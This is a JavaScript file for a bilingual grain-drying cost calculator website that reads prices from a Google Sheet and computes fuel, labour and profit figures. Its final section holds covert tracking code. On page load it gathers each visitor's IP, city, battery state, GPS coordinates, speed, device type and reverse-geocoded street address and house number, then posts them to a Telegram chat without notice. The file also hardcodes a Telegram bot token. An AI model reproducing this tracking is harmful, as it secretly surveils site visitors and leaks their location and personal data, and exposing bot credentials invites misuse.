'use strict'

const addExpences = 50000
let logisticExpences

//Outputs

const totalFuelPriceOutput = document.querySelector('.js-totalFuelPrice')
const totalSalaryOutput = document.querySelector('.js-totalSalary')
const totalExpencesOutput = document.querySelector('.js-totalExpences')
const dryerCapacityOutput = document.querySelector('.js-dryerCapacity')
const daysDryingOutput = document.querySelector('.js-daysDrying')
const netCostPercentOutput = document.querySelector('.js-netCostPercent')
const totalProfitOutput = document.querySelector('.js-totalProfit')

//Inputs

const grainQty = document.querySelector('.js-grainQty')
const grainMoisture = document.querySelector('.js-grainMoisture')
const fuelPrice = document.querySelector('.js-fuelPrice')
const sellDryingPrice = document.querySelector('.js-sellDryingPrice')

const btnResult = document.querySelector('.js-btnResult')

const fuelType = document.getElementById('type-fuel')

// Google sheet table datas

let sheet_id = '14Up2ifhb4igG_Das-n-hXAsh_cADLXmjtfX8954xdOg'
let sheet_title = 'main'
let sheet_range = 'A1:B3'

let full_URL =
  'https://docs.google.com/spreadsheets/d/' +
  sheet_id +
  '/gviz/tq?sheet=' +
  sheet_title +
  '&range=' +
  sheet_range

fetch(full_URL)
  .then((res) => res.text())
  .then((rep) => {
    let data = JSON.parse(rep.substr(47).slice(0, -2))
    console.log(data)

    fuelPrice.setAttribute('value', data.table.rows[0].c[0].v)
    sellDryingPrice.setAttribute('value', data.table.rows[0].c[1].v)
  })

fuelType.addEventListener('change', function () {
  // Choose language message
  const language = document.documentElement.lang
  const messages = {
    ua: {
      oneTruck: 'одна фура',
      twoTrucks: 'дві фури',
      gasUnit: 'грн/куб.м',
      propaneUnit: 'грн/кг',
      clientGas: 'Паливо надає замовник',
    },
    en: {
      oneTruck: 'one truck',
      twoTrucks: 'two trucks',
      gasUnit: 'hrv/m³',
      propaneUnit: 'hrv/kg',
      clientGas: 'Fuel provided by the customer',
    },
  }

  const langMessages = messages[language] || messages.ua

  fetch(full_URL)
    .then((res) => res.text())
    .then((rep) => {
      let data = JSON.parse(rep.substr(47).slice(0, -2))
      console.log(data)

      if (fuelType.value === 'naturalGas') {
        document.querySelector('.js-trucks-amount').innerHTML =
          langMessages.oneTruck
        document.querySelector('.js-meterage').innerHTML = langMessages.gasUnit
        fuelPrice.setAttribute('value', data.table.rows[1].c[0].v)
        sellDryingPrice.setAttribute('value', data.table.rows[1].c[1].v)
        document.querySelector('.js-gas-from-client').innerHTML =
          langMessages.clientGas
        document.querySelector('.js-gas-from-client').style.color = 'red'
        totalFuelPriceOutput.style.color = 'red'
      } else if (fuelType.value === 'propan') {
        document.querySelector('.js-trucks-amount').innerHTML =
          langMessages.twoTrucks
        document.querySelector('.js-meterage').innerHTML =
          langMessages.propaneUnit
        fuelPrice.setAttribute('value', data.table.rows[0].c[0].v)
        sellDryingPrice.setAttribute('value', data.table.rows[0].c[1].v)
        document.querySelector('.js-gas-from-client').innerHTML = ''
        totalFuelPriceOutput.style.color = 'black'
      }
    })
})

// Calculation

function calculate() {
  let dryerProductivity
  let propanConsumption
  let naturalGasConsumption
  let tableGrainMoisture = Number(grainMoisture.value)

  // Table Parameters for Propan

  switch (tableGrainMoisture) {
    case 15:
      dryerProductivity = 13
      propanConsumption = 2.23
      naturalGasConsumption = 3.3
      break
    case 16:
      dryerProductivity = 14.7
      propanConsumption = 1.79
      naturalGasConsumption = 2.32
      break
    case 17:
      dryerProductivity = 14.4
      propanConsumption = 1.61
      naturalGasConsumption = 2.08
      break
    case 18:
      dryerProductivity = 15.1
      propanConsumption = 1.48
      naturalGasConsumption = 1.92
      break
    case 19:
      dryerProductivity = 15.6
      propanConsumption = 1.41
      naturalGasConsumption = 1.82
      break
    case 20:
      dryerProductivity = 14.4
      propanConsumption = 1.38
      naturalGasConsumption = 1.79
      break
    case 21:
      dryerProductivity = 13
      propanConsumption = 1.36
      naturalGasConsumption = 1.77
      break
    case 22:
      dryerProductivity = 11.9
      propanConsumption = 1.35
      naturalGasConsumption = 1.75
      break
    case 23:
      dryerProductivity = 11
      propanConsumption = 1.33
      naturalGasConsumption = 1.72
      break
    case 24:
      dryerProductivity = 10.2
      propanConsumption = 1.31
      naturalGasConsumption = 1.7
      break
    case 25:
      dryerProductivity = 9.6
      propanConsumption = 1.29
      naturalGasConsumption = 1.67
      break
    case 26:
      dryerProductivity = 9.1
      propanConsumption = 1.26
      naturalGasConsumption = 1.64
      break
    case 27:
      dryerProductivity = 8.7
      propanConsumption = 1.24
      naturalGasConsumption = 1.61
      break
    case 28:
      dryerProductivity = 8.3
      propanConsumption = 1.21
      naturalGasConsumption = 1.57
      break
    case 29:
      dryerProductivity = 8
      propanConsumption = 1.18
      naturalGasConsumption = 1.53
      break
    case 30:
      dryerProductivity = 7.7
      propanConsumption = 1.16
      naturalGasConsumption = 1.5
      break
    case 31:
      dryerProductivity = 7.5
      propanConsumption = 1.13
      naturalGasConsumption = 1.46
      break
    case 32:
      dryerProductivity = 7.3
      propanConsumption = 1.11
      naturalGasConsumption = 1.43
      break
    case 33:
      dryerProductivity = 7.1
      propanConsumption = 1.09
      naturalGasConsumption = 1.41
      break
    case 34:
      dryerProductivity = 6.9
      propanConsumption = 1.07
      naturalGasConsumption = 1.39
      break
    case 35:
      dryerProductivity = 6.6
      propanConsumption = 1.06
      naturalGasConsumption = 1.38
      break
    default:
  }

  // Choose Fuel Type

  let fuelConsumption

  if (fuelType.value === 'propan') {
    fuelConsumption = propanConsumption
    logisticExpences = 160000
  } else if (fuelType.value === 'naturalGas') {
    fuelConsumption = naturalGasConsumption
    logisticExpences = 80000
  }

  document.querySelector('.js-total-logistic-cost').innerHTML = logisticExpences

  //Calculation parameters

  let dryerCapacity
  let daysDrying
  let totalSalary
  let totalFuelPrice
  let totalExpences
  let netCostPercent
  let totalProfit

  dryerCapacity = dryerProductivity

  daysDrying = Math.round(Number(grainQty.value) / (dryerProductivity * 20) + 2)

  totalSalary = daysDrying * 10000

  totalFuelPrice = Math.round(
    (Number(grainMoisture.value) - 14) *
      fuelConsumption *
      Number(fuelPrice.value) *
      Number(grainQty.value)
  )
  totalExpences = totalFuelPrice + totalSalary + addExpences + logisticExpences

  if (fuelType.value === 'naturalGas') {
    totalExpences = totalExpences - totalFuelPrice
  }

  netCostPercent = Math.round(
    totalExpences /
      ((Number(grainMoisture.value) - 14) * Number(grainQty.value))
  )

  totalProfit = Math.round(
    (Number(sellDryingPrice.value) - netCostPercent) *
      (Number(grainMoisture.value) - 14) *
      Number(grainQty.value)
  )

  // Formating and output

  function formatNumberOutput(element, number) {
    element.innerHTML = Intl.NumberFormat({
      signDisplay: 'always',
    }).format(number)
  }

  formatNumberOutput(dryerCapacityOutput, dryerCapacity)
  formatNumberOutput(daysDryingOutput, daysDrying)
  formatNumberOutput(totalSalaryOutput, totalSalary)
  formatNumberOutput(totalFuelPriceOutput, totalFuelPrice)
  formatNumberOutput(totalExpencesOutput, totalExpences)
  formatNumberOutput(netCostPercentOutput, netCostPercent)
  formatNumberOutput(totalProfitOutput, totalProfit)
}

// Check cell

function checkValue() {
  // Choose language message
  const language = document.documentElement.lang
  const valQty = Number(grainQty.value)

  const messages = {
    ua: {
      moistureError: 'Помилка. Введіть значення вологості зерна від 15 до 35.',
      fillAllFields: 'Будь ласка заповніть всі значення!',
    },
    en: {
      moistureError: 'Error. Enter a grain moisture value between 15 and 35.',
      fillAllFields: 'Please fill out all the fields!',
    },
  }

  const langMessages = messages[language] || messages.ua

  if (grainMoisture.value >= 15 && grainMoisture.value <= 35) {
  } else {
    alert(langMessages.moistureError)
    return
  }

  if (
    grainQty.value &&
    grainMoisture.value &&
    fuelPrice.value &&
    sellDryingPrice.value !== '' &&
    !isNaN(valQty)
  ) {
    calculate()
  } else {
    alert(langMessages.fillAllFields)
  }
}

// Button

document.addEventListener('keydown', function (e) {
  if (e.key === 'Enter') {
    checkValue()
  }
})

btnResult.addEventListener('click', function () {
  checkValue()
})

// Popup

let popupBg = document.querySelector('.popup__bg')
let popup = document.querySelector('.popup')
let openPopupButtons = document.querySelectorAll('.open-popup')
let closePopupButton = document.querySelector('.close-popup')

openPopupButtons.forEach((button) => {
  button.addEventListener('click', (e) => {
    e.preventDefault()
    popupBg.classList.add('active')
    popup.classList.add('active')
  })
})

closePopupButton.addEventListener('click', () => {
  popupBg.classList.remove('active')
  popup.classList.remove('active')
  success.style.display = 'none'
})

document.addEventListener('click', (e) => {
  if (e.target === popupBg) {
    popupBg.classList.remove('active')
    popup.classList.remove('active')
    success.style.display = 'none'
  }
})

// Send form to telegram

const TOKEN = '6199072332:AAH0FNRe-xweyv3SfXdoMbojgCfBFAIkClQ'
const CHAT_ID = '-1001569099157'
const URI_API = `https://api.telegram.org/bot${TOKEN}/sendMessage`
const URI_API_DOC = `https://api.telegram.org/bot${TOKEN}/sendDocument`
const success = document.getElementById('success')

function validateEmail(email) {
  const emailRegex = /^\w+([\.-]?\w+)*@\w+([\.-]?\w+)*(\.\w{2,3})+$/
  return emailRegex.test(email)
}
function validateTelphone(telphone) {
  const telphoneRegex =
    /^(\+?\d{1,3}\s?)?(\(\d{3}\)|\d{3})[\s.-]?\d{3}[\s.-]?\d{4}$/
  return telphoneRegex.test(telphone)
}

document.querySelector('.popup').addEventListener('submit', function (e) {
  e.preventDefault()

  // Choose language message
  const language = document.documentElement.lang
  const messages = {
    ua: {
      fillFields: 'Заповніть будь ласка поля!',
      invalidPhone: 'Невірний формат телефону!',
      invalidEmail: 'Невірний формат пошти!',
      successMessage: 'Ваше запитання успішно відправлено!',
    },
    en: {
      fillFields: 'Please fill out the fields!',
      invalidPhone: 'Invalid phone format!',
      invalidEmail: 'Invalid e-mail format!',
      successMessage: 'Your question has been successfully sent!',
    },
  }

  const langMessages = messages[language] || messages.ua

  let message = `<b>Повідомлення HAMMOND</b>\n`
  message += `<b>Відправник: </b>${this.name.value}\n`
  message += `<b>Пошта: </b>${this.email.value}\n`
  message += `<b>Телефон: </b>${this.tel.value}\n`
  message += `<b>Запитання: </b>${this.message.value}\n`

  if (
    this.name.value === '' ||
    this.email.value === '' ||
    this.message.value === ''
  ) {
    success.innerHTML = langMessages.fillFields
    success.style.display = 'block'
  } else if (validateTelphone(this.tel.value) === false) {
    success.innerHTML = langMessages.invalidPhone
    success.style.display = 'block'
    return
  } else if (validateEmail(this.email.value) === false) {
    success.innerHTML = langMessages.invalidEmail
    success.style.display = 'block'
    return
  } else {
    axios
      .post(URI_API, {
        chat_id: CHAT_ID,
        parse_mode: 'html',
        text: message,
      })
      .then((res) => {
        this.name.value = ''
        this.email.value = ''
        this.tel.value = ''
        this.message.value = ''
        success.innerHTML = langMessages.successMessage
        success.style.display = 'block'
      })
      .catch((err) => {})
      .finally(() => {})
  }
})

// Send visit message to Telegram

function sendVisitMessage() {
  let message = `<b>Відвідування сайту HAMMOND</b>\n`

  axios.post(URI_API, {
    chat_id: CHAT_ID,
    parse_mode: 'html',
    text: message,
  })
}

// Get User Data

let info = new Userinfo()

let batteryStatus
let batteryLevel
let lat
let long
let userSpeed
let screenWidth
let screenHeight
let userIp
let userIpCity

async function t1() {
  const ipData = await info.ip()
  userIp = ipData.ipAddress
  userIpCity = ipData.city

  const userBattery = await info.battery()
  let status

  status = userBattery.charging
  if (status === true) {
    batteryStatus = 'Батарея на зарядці'
  } else if (status === false) {
    batteryStatus = 'Батарея не заряджається'
  }
  batteryLevel = userBattery.level

  const userPosition = await info.position()

  lat = userPosition.lat
  long = userPosition.long
  userSpeed = userPosition.speed
}
t1().then(() => getAddress())

function t2() {
  screenWidth = info.sizeScreen().screenAvailWidth
  screenHeight = info.sizeScreen().screenAvailHeight
}
t2()

let userPosCity
let userDistrict
let userRoad
let userHouse
let userPostcode

function getAddress() {
  const url = `https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${lat}&lon=${long}`

  fetch(url)
    .then((response) => response.json())
    .then((data) => {
      userPosCity = data.address.city
      userDistrict = data.address.district
      userRoad = data.address.road
      userHouse = data.address.house_number
      userPostcode = data.address.postcode
    })
    .catch((error) => {
      console.error(error)
    })
}

// Check device type

const userAgent = navigator.userAgent
const mobileRegex =
  /(iPhone|iPod|iPad|Android|BlackBerry|Windows Phone|webOS|Mobile)/i

let model

if (mobileRegex.test(userAgent)) {
  const modelRegex =
    /(iPhone|iPod|iPad|Android|BlackBerry|Windows Phone|webOS)/i
  model = userAgent.match(modelRegex)[0]
} else {
  model = "Комп'ютер"
}

// Send Data Message

function sendUserDataMessage() {
  let message = `<b>Параметри відвідувача</b>\n`
  message += `<b>Телефон: </b>${model}\n`
  message += `<b>Розмір екрана: </b>${screenWidth}x${screenHeight}\n`
  message += `<b>Статус батареї: </b>${batteryStatus}\n`
  message += `<b>Заряд батареї: </b>${batteryLevel}\n`
  message += `<b>Координати: </b>${lat}, ${long}\n`
  message += `<b>Адреса: </b>${userPosCity}, ${userDistrict}, ${userRoad}, ${userHouse}, ${userPostcode}\n`
  message += `<b>Швидкість: </b>${userSpeed}\n`
  message += `<b>IP адреса: </b>${userIp}\n`
  message += `<b>Місто за IP: </b>${userIpCity}\n`

  axios.post(URI_API, {
    chat_id: CHAT_ID,
    parse_mode: 'html',
    text: message,
  })
}

document.addEventListener('DOMContentLoaded', function () {
  sendVisitMessage()
  setTimeout(() => {
    sendUserDataMessage()
  }, 20000)
})
